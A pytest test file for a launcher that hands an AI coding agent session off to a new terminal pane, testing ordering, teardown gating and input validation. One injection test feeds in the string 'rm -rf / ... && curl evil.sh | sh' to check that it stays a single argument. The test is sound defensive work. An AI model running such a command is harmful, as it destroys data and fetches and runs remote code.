"""Tests for the herdr launcher mode (#611, epic #667).

Rewritten after the Step-8a cross-model review returned FAIL on the first attempt. The two
findings that shaped this file:

1. **The first attempt was disconnected builders, not a launcher.** `handoff_plan` returned a
   step whose argv was `None`, nothing read the artifacts it named, and no non-test caller
   existed. So the centrepiece here is `TestPerformHandoff`, which drives the WIRED
   `perform_handoff` end to end through an injected runner and injected readers — proving the
   ordered sequence, the abort-at-first-failure behaviour, and that teardown really is last.
2. **Arming `/goal` at birth was falsified.** herdr rejects a control character in a native
   agent argument, and a real condition is multiline. So `build_agent_start_argv` now carries
   NO goal, and `test_agent_start_never_carries_the_goal` pins that; the goal is armed after
   readiness via the proven send-text route.

The regression that would hurt most and show least is a return to `--current`: it resolves
fine interactively and fails only under cron, i.e. only unattended, i.e. only where nobody is
watching. `test_split_never_uses_current` exists for that.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
HOOKS = REPO_ROOT / "hooks"
CLI = HOOKS / "launcher_lib.py"

if str(HOOKS) not in sys.path:
    sys.path.insert(0, str(HOOKS))

import launcher_lib as ll  # noqa: E402


class FakeProc:
    def __init__(self, returncode=0, stdout=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = ""


class Runner:
    """Records every argv it is handed and replays canned responses by command shape."""

    def __init__(self, responses=None, fail_on=None):
        self.calls: list[list[str]] = []
        self.responses = responses or {}
        self.fail_on = fail_on

    def key(self, argv):
        return " ".join(argv[:3])

    def __call__(self, argv, timeout=180):
        assert isinstance(argv, list) and all(isinstance(a, str) for a in argv), \
            "runner must only ever receive a list[str] argv — never a shell string"
        self.calls.append(list(argv))
        k = self.key(argv)
        if self.fail_on and k.startswith(self.fail_on):
            return FakeProc(returncode=1)
        if k == "herdr pane list" and k not in self.responses:
            # Default inventory: only the predecessor exists, so an uncertain split reconciles
            # to "nothing was created". Tests that exercise the reconcile supply their own.
            return FakeProc(0, PANE_LIST_ANCHOR_ONLY)
        return FakeProc(0, self.responses.get(k, ""))

    def kinds(self):
        return [self.key(a) for a in self.calls]


SPLIT_OK = json.dumps({"result": {"pane_id": "w1:pZZ"}})
PANE_LIST_ANCHOR_ONLY = json.dumps({"result": {"panes": [{"pane_id": "w1:p1"}]}})
# #694: a real `herdr pane get` response ALSO carries `agent_status`; this fixture omitted it, so
# every `perform_handoff` test drove a successor whose readiness could not be known. That is the
# same class of fixture unrealism the module docstring blames for letting an ordering-free prompt
# ship — see `PANE_GET_REAL` below, captured verbatim from herdr 0.7.5 on 2026-07-29.
PANE_GET_OK = json.dumps({"result": {"pane": {
    "pane_id": "w1:pZZ",
    "agent_status": "idle",
    "agent_session": {"agent": "claude", "kind": "id", "source": "herdr:claude",
                      "value": "sess-new-123"}}}})


def _pane_get(status=None, *, session="sess-new-123"):
    """A `pane get` response with an explicit `agent_status` (omitted entirely when None)."""
    pane = {"pane_id": "w1:pZZ",
            "agent_session": {"agent": "claude", "kind": "id", "source": "herdr:claude",
                              "value": session}}
    if status is not None:
        pane["agent_status"] = status
    return json.dumps({"result": {"pane": pane}})


# A REAL response, captured verbatim from the live herdr 0.7.5 server on this host (2026-07-29).
# It exists so the status parser is proven against real bytes and real key ordering, not only
# against hand-written dicts that happen to match the parser's assumptions (#694 review, F2).
PANE_GET_REAL = (REPO_ROOT / "tests" / "fixtures" / "herdr"
                 / "pane_get_idle.json").read_text(encoding="utf-8")
REGISTRY_OK = '{"session_id":"sess-new-123","project":"rawgentic"}\n'
GOAL_FIXTURE = REPO_ROOT / "tests" / "fixtures" / "herdr" / "goal_status_transcript.jsonl"
TRANSCRIPT_OK = GOAL_FIXTURE.read_text(encoding="utf-8")
GOAL_CONDITION = ("PR open with green CI, or a blocker is posted to the issue via the ERROR "
                  "protocol")
# #694: a realistic prompt for the herdr handoff path carries NO bind at all — `perform_handoff`
# sends `/rawgentic:switch <project>` as SEND 1, its own turn gated on the registry row, and refuses
# a prompt that would make the successor run the switch skill twice.
#
# This fixture has now been wrong in both directions, which is why it is commented rather than just
# edited. Originally it said only "Re-bind the project" with no directive at all, so 55
# `perform_handoff` tests passed against a prompt that could never have made `project_switched`
# succeed — the unrealism that let an ordering-free prompt ship (#682). #682 then made it open with
# the bind, which was right while the bind travelled inside the prompt. The bind now travels on its
# own, so a prompt carrying one is the unrealistic case again.
PROJECT = "rawgentic"
RESUME_PROMPT = ("Fresh-session resume: git fetch origin, read the driver-state, and run the next "
                 "ready child to full WF2 completion. Derive position from durable state.")
# The pre-#694 shape, kept so a test can prove the launcher REFUSES it rather than silently
# double-binding a successor.
RESUME_PROMPT_WITH_BIND = (
    "/rawgentic:switch rawgentic — run this FIRST, before reading any file. An unbound "
    "session cannot Read under projects/. THEN run the next child.")
REGISTRY_PATH = "/reg.jsonl"


class Artifacts:
    """Models the two on-disk artifacts as they really behave over a launch.

    #611 Step-11 Medium 4: the evidence that authorises predecessor teardown must be
    *launch-bound*. Before the launch each artifact holds whatever history it already had
    (``*_pre``); the successor's own rows appear only afterwards. ``perform_handoff`` captures a
    pre-launch offset and may only count what lands AFTER it — so seeding ``registry_pre`` with a
    matching row must NOT satisfy the check.

    ``appear_after`` is the number of reads that still return only the pre-launch content, which
    lets a test drive the bounded-polling path deterministically.
    """

    def __init__(self, registry=REGISTRY_OK, transcript=TRANSCRIPT_OK,
                 registry_pre="", transcript_pre="", appear_after=1):
        self.registry, self.transcript = registry, transcript
        self.registry_pre, self.transcript_pre = registry_pre, transcript_pre
        self.appear_after = appear_after
        self.reads: dict[str, int] = {}

    def __call__(self, path):
        n = self.reads.get(path, 0) + 1
        self.reads[path] = n
        pre, post = ((self.registry_pre, self.registry) if path == REGISTRY_PATH
                     else (self.transcript_pre, self.transcript))
        return pre + (post if n > self.appear_after else "")


def _predecessor_closed(runner) -> bool:
    """True if the PREDECESSOR pane was closed. On any failed handoff this must stay False —
    the predecessor has to remain alive AND still guarded. Closing the tentative SUCCESSOR is
    correct cleanup and is asserted separately."""
    return any(c[:3] == ["herdr", "pane", "close"] and c[3] == "w1:p1" for c in runner.calls)


def _handoff(**over):
    kw = dict(
        anchor_pane="w1:p1", cwd=str(REPO_ROOT), project_root=str(REPO_ROOT),
        name="child4", goal_condition=GOAL_CONDITION, resume_prompt=RESUME_PROMPT,
        expected_project=PROJECT, registry_path=REGISTRY_PATH,
        transcript_dir="/tmp",
        read_text=Artifacts(), sleeper=lambda _s: None,
        # #700 field defect 1: `perform_handoff` no longer carries a teardown default, because the
        # library defaulting ON while the ad-hoc CLI defaulted OFF is how the two surfaces came to
        # disagree about one operation. These tests are the ones that prove teardown is BLOCKED
        # until every check passes, so they must ASK for it — otherwise they pass vacuously.
        teardown=True,
        # #726 — every handoff must declare the predecessor's in-flight work. These
        # tests are not about that gate, so they attest to none; the gate's own tests
        # live in tests/hooks/test_inflight_handoff_gate.py.
        inflight={"items": [], "attested_none": True, "override": False},
    )
    kw.update(over)
    return kw


def _sent(runner) -> list[str]:
    """The text of every `herdr pane send-text`, in order."""
    return [c[4] for c in runner.calls if c[:3] == ["herdr", "pane", "send-text"]]


def _raise(exc):
    def reader(_path):
        raise exc
    return reader


# ---------------------------------------------------------------------------
# AC1 — the split, and the flag that must never come back
# ---------------------------------------------------------------------------

def test_split_uses_the_explicit_anchor_pane() -> None:
    argv = ll.build_split_argv(anchor_pane="w1:p1", cwd=str(REPO_ROOT),
                               project_root=str(REPO_ROOT))
    assert argv[:3] == ["herdr", "pane", "split"]
    assert argv[argv.index("--pane") + 1] == "w1:p1"


def test_split_never_uses_current() -> None:
    argv = ll.build_split_argv(anchor_pane="w1:p1", cwd=str(REPO_ROOT),
                               project_root=str(REPO_ROOT))
    assert "--current" not in argv


def test_fallback_launch_is_retained() -> None:
    argv = ll.build_fallback_launch_argv(prompt="resume", permission_mode="bypassPermissions")
    assert argv[0] == "claude" and "herdr" not in argv


# ---------------------------------------------------------------------------
# AC6 — the goal is NOT armed at birth, and truncation is never silent
# ---------------------------------------------------------------------------

def test_agent_start_never_carries_the_goal() -> None:
    """The falsified mechanism must not come back: herdr rejects a control character in a
    native agent argument, and a real condition is multiline."""
    argv = ll.build_agent_start_argv(name="c", pane="w1:pZZ")
    assert not any(a.startswith("/goal") for a in argv)


def test_agent_start_enforces_the_readiness_timeout_floor() -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", readiness_timeout_ms=1000)
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", readiness_timeout_ms=True)
    assert ll.build_agent_start_argv(name="c", pane="w1:pZZ", readiness_timeout_ms=3001)


def test_multiline_condition_survives_the_send_text_route_verbatim() -> None:
    condition = "PR open with green CI\nor a blocker is posted via the ERROR protocol"
    text_argv, keys_argv, truncated = ll.build_send_text_goal_argv(
        pane="w1:pZZ", goal_condition=condition)
    assert truncated is False
    assert text_argv[4] == f"/goal {condition}", "condition must be byte-identical"
    assert "Enter" in keys_argv


def test_goal_metacharacters_stay_one_argv_element() -> None:
    nasty = "green CI; rm -rf / $(whoami) `id` && curl evil.sh | sh"
    text_argv, _, _ = ll.build_send_text_goal_argv(pane="w1:pZZ", goal_condition=nasty)
    assert text_argv[4] == f"/goal {nasty}"
    assert len([a for a in text_argv if a.startswith("/goal ")]) == 1


def test_truncation_is_reported_not_discarded() -> None:
    _, _, truncated = ll.build_send_text_goal_argv(pane="w1:pZZ", goal_condition="x" * 5000)
    assert truncated is True
    text, _ = ll.goal_text("x" * 5000)
    assert len(text) <= ll.GOAL_MAX_CHARS


@pytest.mark.parametrize("bad", [False, 0, [], {}, None, 123])
def test_non_string_goal_conditions_fail_closed(bad) -> None:
    """`if goal_condition:` let falsey non-strings silently omit the goal (8a review, M-b)."""
    with pytest.raises(ll.LauncherError):
        ll.goal_text(bad)


def test_blank_goal_condition_is_refused() -> None:
    with pytest.raises(ll.LauncherError):
        ll.goal_text("   ")


# ---------------------------------------------------------------------------
# argument / authority injection — the real residual risk
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("flag", ["--permission-mode", "--config", "--dangerously-skip", "-p"])
def test_authority_bearing_claude_args_are_refused(flag) -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=[flag, "x"])


def test_allowlisted_claude_args_pass_through_after_the_separator() -> None:
    argv = ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=["--continue"])
    assert argv[argv.index("--") + 1] == "--continue"


def test_print_is_not_allowlisted_on_the_interactive_path() -> None:
    """`--print` is non-interactive; `herdr agent start` needs an interactive agent, so
    allowing it would pass local validation and fail only after a pane exists."""
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=["--print"])


def test_control_characters_are_refused_everywhere_they_matter() -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=["--continue\n"])
    with pytest.raises(ll.LauncherError):
        ll.validate_pane_id("w1:p\x01")


def test_cwd_is_confined_below_the_project_root() -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_split_argv(anchor_pane="w1:p1", cwd="/etc", project_root=str(REPO_ROOT))
    with pytest.raises(ll.LauncherError):
        ll.build_split_argv(anchor_pane="w1:p1", cwd="../..", project_root=str(REPO_ROOT))
    assert ll.build_split_argv(anchor_pane="w1:p1", cwd="hooks", project_root=str(REPO_ROOT))


@pytest.mark.parametrize("bad", ["--current", "-x", "", "w1:p1 x", "w1:p1;id", "w" * 200])
def test_malformed_pane_ids_are_refused(bad) -> None:
    with pytest.raises(ll.LauncherError):
        ll.validate_pane_id(bad)


def test_pane_id_regex_rejects_unicode_digits() -> None:
    """`\\d` admitted `w١:p1`; the charset is explicit now (8a review, Low)."""
    with pytest.raises(ll.LauncherError):
        ll.validate_pane_id("w١:p1")


@pytest.mark.parametrize("bad", ["-evil", "", "a b", "x" * 200, "Child4", "9lives", "has.dot"])
def test_malformed_agent_names_are_refused(bad) -> None:
    with pytest.raises(ll.LauncherError):
        ll.validate_agent_name(bad)


# ---------------------------------------------------------------------------
# mode selection — must not hand out a successor known to be unusable
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("backend,avail,supports,expected", [
    ("herdr", True, True, "herdr"),
    ("herdr", False, True, "single_session"),
    ("herdr", True, False, "single_session"),
    ("tmux", True, True, "pane_less"),
    (None, False, False, "pane_less"),
])
def test_mode_selection_matches_the_driver_lib_contract(backend, avail, supports, expected):
    """A herdr-gated project that cannot get a pane keeps the single-session loop rather than
    launching a pane-less successor that would die at its first build-seat dispatch
    (8a review, M-c; mirrors driver_lib.fresh_session_available)."""
    mode, reason = ll.select_launch_mode(terminal_backend=backend, herdr_available=avail,
                                         launcher_supports_herdr=supports)
    assert mode == expected
    assert reason.strip()


# ---------------------------------------------------------------------------
# AC7 — the readers actually read
# ---------------------------------------------------------------------------

def test_pane_agent_session_is_parsed_from_a_real_shaped_response() -> None:
    assert ll.parse_pane_agent_session(PANE_GET_OK) == "sess-new-123"


@pytest.mark.parametrize("bad", ["", "not json", "{}", json.dumps({"result": {"pane": {}}}),
                                 json.dumps({"result": {"pane": {"agent_session": {}}}})])
def test_absent_agent_session_reads_as_none_not_success(bad) -> None:
    assert ll.parse_pane_agent_session(bad) is None


def test_registry_match_requires_the_new_session_id() -> None:
    assert ll.registry_has_session(REGISTRY_OK, "sess-new-123") is True
    assert ll.registry_has_session(REGISTRY_OK, "sess-old-999") is False
    assert ll.registry_has_session("garbage\n", "sess-new-123") is False


def test_goal_armed_reads_the_REAL_transcript_shape() -> None:
    """The critical regression (#611 Step-11 High 2).

    An earlier revision matched `{"goal_status": {"met": false}}` — a shape this repo
    INVENTED, which its own tests then fed back. Against real output the check always
    returned False, so `goal_armed` could never pass and teardown could never fire. The
    fixture is real-shaped (`attachment.type == "goal_status"`), verified against live
    transcripts, so the invented shape cannot come back unnoticed.
    """
    assert ll.transcript_has_unmet_goal(TRANSCRIPT_OK) is True
    assert "\"attachment\"" in TRANSCRIPT_OK and '"type":"goal_status"' in TRANSCRIPT_OK
    met_only = "\n".join(l for l in TRANSCRIPT_OK.splitlines() if '"met":true' in l)
    assert met_only, "fixture must carry a met:true line to test against"
    assert ll.transcript_has_unmet_goal(met_only) is False, \
        "an already-met goal does not prove the successor is guarded"
    assert ll.transcript_has_unmet_goal("") is False
    assert ll.transcript_has_unmet_goal('{"goal_status":{"met":false}}') is False, \
        "the invented shape must NOT be accepted"


def test_ladder_is_ordered_and_names_on_disk_artifacts() -> None:
    """The order is CAUSAL, not alphabetical, and #694 reordered it to match the sends: the bind is
    its own send so its registry row comes first, and `/goal` goes last so `goal_armed` does too.
    Each rung is the durable artifact written by the send before it. The constraint that survives
    from the earlier revisions is the one they broke: a rung must never be checked before the send
    that produces it has actually gone out, or it can only pass on stale evidence."""
    steps = ll.handoff_verification_steps()
    assert [s["step"] for s in steps] == ["spawned", "project_switched", "goal_armed"]
    for s in steps:
        assert s["artifact"].strip()
        assert "pane text" not in s["artifact"].lower()
        assert "agent_status" not in s["artifact"], \
            "no rung may rest on pane status — it is not a synchronisation signal (#694)"


def test_ladder_aborts_at_the_first_failure() -> None:
    ok, failed, checked = ll.evaluate_verifications(
        {"spawned": True, "project_switched": False, "goal_armed": True})
    assert (ok, failed, checked) == (False, "project_switched", ["spawned", "project_switched"])


def test_missing_result_is_failure_not_pass() -> None:
    ok, failed, _ = ll.evaluate_verifications({"spawned": True})
    assert ok is False and failed == "project_switched"


def test_teardown_refused_until_every_check_passes() -> None:
    allowed, reason = ll.teardown_allowed({"spawned": True, "project_switched": True,
                                           "goal_armed": False})
    assert allowed is False and "goal_armed" in reason


# ---------------------------------------------------------------------------
# the wired path — this is what the review found missing
# ---------------------------------------------------------------------------

class TestPerformHandoff:
    def test_happy_path_runs_the_full_ordered_sequence(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert out["new_pane"] == "w1:pZZ"
        assert out["session_id"] == "sess-new-123"
        assert out["results"] == {"spawned": True, "goal_armed": True,
                                  "project_switched": True}
        assert r.kinds() == [
            "herdr agent list",                                 # #731 name preflight, FIRST
            "herdr pane list",                                  # pre-split inventory
            "herdr pane split", "herdr agent start", "herdr agent wait", "herdr pane get",
            "herdr pane send-text", "herdr pane send-keys",     # SEND 1 — the bind, alone
            "herdr agent wait",                                 # #989 — idle BEFORE the goal
            "herdr pane send-text", "herdr pane send-keys",     # SEND 2 — the goal, into idle
            "herdr pane send-text", "herdr pane send-keys",     # SEND 3 — the prompt, LAST
            "herdr pane close",                                 # the predecessor, LAST of all
        ]
        assert out["cleanup"] is None, "nothing to clean up when ownership transferred"

    def test_teardown_is_the_final_call(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff())
        assert r.kinds()[-1] == "herdr pane close"
        assert r.kinds().count("herdr pane close") == 1

    def test_goal_is_pasted_only_after_readiness(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff())
        kinds = r.kinds()
        assert kinds.index("herdr agent wait") < kinds.index("herdr pane send-text")

    @pytest.mark.parametrize("fail_at,expected", [
        ("herdr pane split", "split"),
        ("herdr agent start", "agent_start"),
        ("herdr agent wait", "agent_wait"),
        # the FIRST send-text is now the bind (#694), so that is the step a send-text failure
        # aborts at — nothing else has been sent yet
        ("herdr pane send-text", "send_bind"),
    ])
    def test_a_failed_step_aborts_and_never_tears_down(self, fail_at, expected) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                   fail_on=fail_at)
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False
        assert out["failed_step"] == expected
        assert not _predecessor_closed(r), \
            "the predecessor must stay alive AND guarded when the handoff fails"
        if out["new_pane"]:
            # a pane was created, so it must have been cleaned up; when the SPLIT itself
            # failed there is nothing to clean up and `cleanup` is correctly None
            assert out["cleanup"] and "closed tentative pane" in out["cleanup"], \
                f"{fail_at}: tentative successor leaked"
        else:
            assert out["cleanup"] is None

    def test_unparseable_split_response_aborts(self) -> None:
        r = Runner({"herdr pane split": "not json"})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "split_response_unparseable"
        # no pane id was parsed, so there is nothing to clean up and nothing to retire
        assert not _predecessor_closed(r) and out["cleanup"] is None

    def test_absent_agent_session_blocks_teardown(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK,
                    "herdr pane get": json.dumps({"result": {"pane": {}}})})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "spawned"
        assert not _predecessor_closed(r)

    def test_registry_without_the_new_session_blocks_teardown(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(registry='{"session_id":"someone-else"}\n')))
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert not _predecessor_closed(r)

    def test_unarmed_goal_blocks_teardown(self) -> None:
        """`Artifacts` rather than a bare lambda: the registry evidence has to be LAUNCH-BOUND, and
        since #694 checks `project_switched` FIRST a fixture whose row is already present at
        baseline now fails there instead — hiding the goal_armed case this test is about."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=Artifacts(transcript="")))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"
        assert not _predecessor_closed(r)

    def test_unreadable_artifact_is_a_failure_not_a_pass(self) -> None:
        def boom(path):
            raise OSError("gone")
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=boom))
        assert out["ok"] is False
        assert not _predecessor_closed(r)

    def test_truncation_is_surfaced_on_the_wired_path(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(goal_condition="x" * 5000))
        assert out["truncated"] is True
        note = [s for s in out["steps"] if s["kind"] == "send_text"][0]["note"]
        assert note and "TRUNCATED" in note

    def test_runner_only_ever_receives_argv_lists(self) -> None:
        """The Runner asserts this on every call; this test makes the guarantee explicit."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff())
        assert r.calls and all(isinstance(c, list) for c in r.calls)


# ---------------------------------------------------------------------------
# CLI (black-box via subprocess, per docs/testing.md)
# ---------------------------------------------------------------------------

def _cli(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, str(CLI), *args], capture_output=True,
                          text=True, check=False)


def test_cli_rejects_the_removed_capability_flag() -> None:
    """#927 PR 2 (finding S2): `--herdr-available` was a caller-ASSERTED capability claim for
    something this module can derive. A stale assertion is exactly what #927 exists to stop, so
    the flag is gone rather than deprecated — a silently-ignored flag is worse than a refused one.
    """
    proc = _cli("select-mode", "--terminal-backend", "herdr", "--herdr-available")
    assert proc.returncode == 2
    assert "unrecognized arguments" in proc.stderr


def test_cli_derives_the_capability_and_still_needs_the_launcher_to_advertise() -> None:
    """The `--launcher-herdr` half is NOT derived and must stay caller-asserted: it is a claim
    about the LAUNCHER's own support, which this process cannot observe (8a review, M-a)."""
    proc = _cli("select-mode", "--terminal-backend", "herdr")
    assert proc.returncode == 0, proc.stderr
    assert "single_session" in proc.stdout


def test_cli_derives_the_capability_from_PATH_not_from_the_environment(tmp_path) -> None:
    """#927 PR 2 removed `--herdr-available`, so `select-mode` derives the capability with
    `shutil.which`. That makes this assertion environment-DEPENDENT unless the environment is
    controlled: it passed locally (herdr installed) and failed in CI (herdr absent) before this
    fixture existed. A fake `herdr` on PATH tests the derivation itself rather than the host.
    """
    fake = tmp_path / "bin"
    fake.mkdir()
    (fake / "herdr").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    (fake / "herdr").chmod(0o755)
    env = {**os.environ, "PATH": f"{fake}:{os.environ.get('PATH', '')}"}
    proc = subprocess.run([sys.executable, str(CLI), "select-mode", "--terminal-backend", "herdr",
                           "--launcher-herdr"], capture_output=True, text=True, check=False,
                          env=env)
    assert proc.returncode == 0, proc.stderr
    assert "herdr" in proc.stdout and "single_session" not in proc.stdout

    # And with NOTHING named herdr reachable, the same invocation degrades — no flag involved.
    empty = tmp_path / "empty"
    empty.mkdir()
    bare = subprocess.run([sys.executable, str(CLI), "select-mode", "--terminal-backend", "herdr",
                           "--launcher-herdr"], capture_output=True, text=True, check=False,
                          env={**os.environ, "PATH": str(empty)})
    assert bare.returncode == 0, bare.stderr
    assert "single_session" in bare.stdout


def test_cli_build_split_emits_argv_without_current() -> None:
    proc = _cli("build-split", "--anchor-pane", "w1:p1", "--cwd", str(REPO_ROOT),
                "--project-root", str(REPO_ROOT))
    assert proc.returncode == 0, proc.stderr
    assert "--current" not in json.loads(proc.stdout)


def test_cli_rejects_cwd_outside_the_project_root() -> None:
    proc = _cli("build-split", "--anchor-pane", "w1:p1", "--cwd", "/etc",
                "--project-root", str(REPO_ROOT))
    assert proc.returncode == 2 and "outside the project root" in proc.stderr


def test_cli_build_fallback_gives_the_pane_less_path_an_entry_point() -> None:
    """AC1's second half. Without this the builder had no caller at all — the disconnected
    smell the Step-8a review named."""
    proc = _cli("build-fallback", "--prompt", "resume", "--wall-timeout", "5h")
    assert proc.returncode == 0, proc.stderr
    argv = json.loads(proc.stdout)
    assert argv[:2] == ["timeout", "5h"] and "herdr" not in argv


def test_cli_goal_text_reports_truncation() -> None:
    proc = _cli("goal-text", "--condition", "x" * 5000)
    assert proc.returncode == 0
    assert json.loads(proc.stdout)["truncated"] is True


class TestTheGoalPayloadNeverEndsWithANewline:
    """A trailing newline on the goal makes the paste land and NEVER submit.

    Found live on 2026-08-07 by controlled experiment, three real handoffs to real panes:
    the SAME 557-character condition failed twice via `--goal-condition-file` (which keeps the
    file's trailing newline) and armed first time via `--goal-condition` inline (which has none).
    The successor transcript carried NO `goal_status` row, NO `queue-operation` row, and not one
    byte of the goal text — the paste sat in the input box and the Enter did not submit it.

    This module already knew the hazard from the other direction. `build_send_text_argv` says a
    multiline payload arrives as one collapsed bracketed paste "which is why the Enter is a
    distinct call rather than a trailing newline". `_read_text_arg` then reads a file VERBATIM,
    deliberately, so a caller's end-of-prompt marker survives — and that is right for the resume
    prompt. For the GOAL it reintroduces exactly the trailing newline the send route excludes.

    So the strip belongs at the goal choke point, never in the shared file reader.
    """

    def test_a_trailing_newline_is_stripped_from_the_sent_payload(self) -> None:
        text_argv, _keys, _trunc = ll.build_send_text_goal_argv(
            pane="w1:p1", goal_condition="ship it when CI is green\n")
        assert not text_argv[4].endswith("\n"), repr(text_argv[4][-40:])
        assert text_argv[4] == "/goal ship it when CI is green"

    def test_trailing_blank_lines_and_spaces_go_too(self) -> None:
        """A file written by a heredoc routinely ends `...\\n`, and an edited one `...\\n\\n  `."""
        text_argv, _keys, _trunc = ll.build_send_text_goal_argv(
            pane="w1:p1", goal_condition="ship it\n\n   \n")
        assert text_argv[4] == "/goal ship it"

    def test_armed_condition_matches_what_was_actually_sent(self) -> None:
        """The binding check compares against this. If the strip happened in only one of the two,
        every capped or file-sourced goal would fail to verify for ever."""
        cond, _trunc = ll.armed_condition("ship it when CI is green\n")
        text_argv, _keys, _trunc2 = ll.build_send_text_goal_argv(
            pane="w1:p1", goal_condition="ship it when CI is green\n")
        assert cond == "ship it when CI is green"
        assert text_argv[4] == "/goal " + cond

    def test_interior_newlines_are_untouched(self) -> None:
        """#654 proved a 41-newline condition arrives fine as a collapsed paste. Only the TRAILING
        newline breaks submission, so stripping interior structure would be a regression."""
        cond = "line one\nline two\n\nline four"
        text_argv, _keys, _trunc = ll.build_send_text_goal_argv(
            pane="w1:p1", goal_condition=cond + "\n")
        assert text_argv[4] == "/goal " + cond
        assert text_argv[4].count("\n") == 3

    def test_a_condition_that_is_only_whitespace_is_still_refused(self) -> None:
        """Stripping must not turn an empty guard into a silently-armed one."""
        with pytest.raises(ll.LauncherError, match="empty"):
            ll.build_send_text_goal_argv(pane="w1:p1", goal_condition="\n\n   \n")

    @pytest.mark.parametrize("ending", ["\n", "\r\n", "\r"])
    def test_one_logical_line_ending_still_carries(self, ending) -> None:
        """Step-11 F2. The one-newline tolerance recognized only LF, so a CRLF file — one
        perfectly ordinary line ending — left a bare CR behind and the carry was refused as a
        substantive difference. `goal_text` accepts and removes all three, so the carry validator
        must recognize the same set or the two disagree about what one line ending is."""
        ok, reason, _ = ll.validate_goal_carry("goal A" + ending, "goal A")
        assert ok, f"{ending!r} is ONE line ending and must carry: {reason}"

    @pytest.mark.parametrize("ending", ["\n\n", "\r\n\r\n", "\r\r"])
    def test_two_logical_line_endings_are_still_refused(self, ending) -> None:
        """The other half — widening to CRLF must not widen to DOUBLED endings."""
        ok, _reason, _ = ll.validate_goal_carry("goal A" + ending, "goal A")
        assert not ok, f"{ending!r} is two line endings and must be refused"

    def test_trailing_spaces_survive_when_there_is_no_line_ending(self) -> None:
        """Step-11 F3. The measured defect is a LINE-ENDING suffix. An unconditional rstrip also
        silently deleted terminal spaces and tabs, which never blocked submission and which the
        carry contract treats as bytes. So the strip fires only on a whitespace run that actually
        contains a line ending."""
        text_argv, _keys, _trunc = ll.build_send_text_goal_argv(
            pane="w1:p1", goal_condition="ship it   ")
        assert text_argv[4] == "/goal ship it   ", repr(text_argv[4])

    def test_spaces_before_a_trailing_newline_go_with_it(self) -> None:
        """A real file routinely ends `...   \\n`. The whole run goes, because it contains one."""
        text_argv, _keys, _trunc = ll.build_send_text_goal_argv(
            pane="w1:p1", goal_condition="ship it   \n")
        assert text_argv[4] == "/goal ship it"

    @pytest.mark.parametrize("ending", ["\n", "\r\n", "\r"])
    def test_every_line_ending_form_is_stripped_from_the_payload(self, ending) -> None:
        text_argv, _keys, _trunc = ll.build_send_text_goal_argv(
            pane="w1:p1", goal_condition="ship it" + ending)
        assert text_argv[4] == "/goal ship it", repr(text_argv[4])

    def test_the_carry_guard_keeps_its_byte_identical_rule(self) -> None:
        """The interaction this fix nearly broke, pinned from BOTH sides.

        `armed_condition` now rstrips, which would have widened `validate_goal_carry` into the
        `strip()` equality that pass-1 F4 refused at the #758 design gate — two trailing newlines
        would have compared equal to none. `test_two_trailing_newlines_are_not_over_normalized`
        caught it. This pins the other direction too, so a future "simplification" that deletes
        the explicit trailing-shape check fails here rather than silently loosening the carry.
        """
        # ONE trailing newline is the documented file artifact and still carries.
        ok, _reason, _override = ll.validate_goal_carry("goal A\n", "goal A")
        assert ok, "a single trailing file newline must still be a verbatim carry"
        # TWO is a real difference and must still be refused.
        ok2, reason2, _ = ll.validate_goal_carry("goal A\n\n", "goal A")
        assert not ok2
        assert "trailing whitespace" in reason2, reason2
        # And the refusal reason must not leak goal CONTENT (pass-1 F8) — lengths only.
        assert "goal A" not in reason2, reason2


# ---------------------------------------------------------------------------
# #611 Step-11 High 1 — the production caller
# ---------------------------------------------------------------------------

# #840 — `_cmd_handoff` now observes `origin/main` UNCONDITIONALLY (Step-11 finding 1), so these
# CLI tests must not point `--project-root` at the real checkout: that would make the suite do a
# live `git fetch` per test and depend on the network. A throwaway repo with a LOCAL origin gives a
# real, observable head with no network at all.
REVAL_LOCAL_HEAD_CACHE: dict = {}


def _local_repo_with_origin(tmp_path):
